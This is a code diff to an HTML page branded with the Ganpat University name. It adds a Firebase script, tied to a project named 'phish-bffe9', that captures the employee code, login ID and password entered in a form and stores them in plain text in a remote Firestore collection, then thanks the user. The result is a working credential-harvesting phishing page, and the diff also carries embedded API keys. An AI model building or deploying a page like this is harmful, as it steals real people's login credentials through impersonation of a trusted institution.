@@ -141,6 +141,53 @@
         &copy; 2024 Ganpat University. All rights reserved.
     </div>
 
-</body>
-
-</html>
+     <!-- Firebase SDK -->
+     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js"></script>
+ 
+     <script>
+         // Firebase configuration
+         const firebaseConfig = {
+             apiKey: "AIzaSyDki8F2WdaqteFzYqy41mag8cgjsjRL2hM",
+             authDomain: "phish-bffe9.firebaseapp.com",
+             projectId: "phish-bffe9",
+             storageBucket: "phish-bffe9.appspot.com",
+             messagingSenderId: "544053179534",
+             appId: "1:544053179534:web:68bf5b3e70f878f20f05df",
+             measurementId: "G-58QJZJ0B2S"
+         };
+ 
+         // Initialize Firebase
+         const app = firebase.initializeApp(firebaseConfig);
+         const db = firebase.firestore();
+ 
+         // Form submission handler
+         document.getElementById('detailsForm').addEventListener('submit', submitForm);
+ 
+         function submitForm(e) {
+             e.preventDefault();
+ 
+             // Get values
+             const empcode = document.getElementById('empcode').value;
+             const loginid = document.getElementById('loginid').value;
+             const passwd = document.getElementById('passwd').value;
+ 
+             // Save to Firebase Firestore
+             db.collection('formResponses').add({
+                 empcode: empcode,
+                 loginid: loginid,
+                 passwd: passwd,
+                 timestamp: firebase.firestore.FieldValue.serverTimestamp()
+             }).then(() => {
+                 alert('Thank you! Your details have been submitted successfully.');
+                 document.getElementById('detailsForm').reset();
+             }).catch((error) => {
+                 console.error('Error saving document: ', error);
+                 alert('Sorry, there was an error sending your details. Please try again.');
+             });
+         }
+     </script>
+ 
+ </body>
+ 
+ </html>
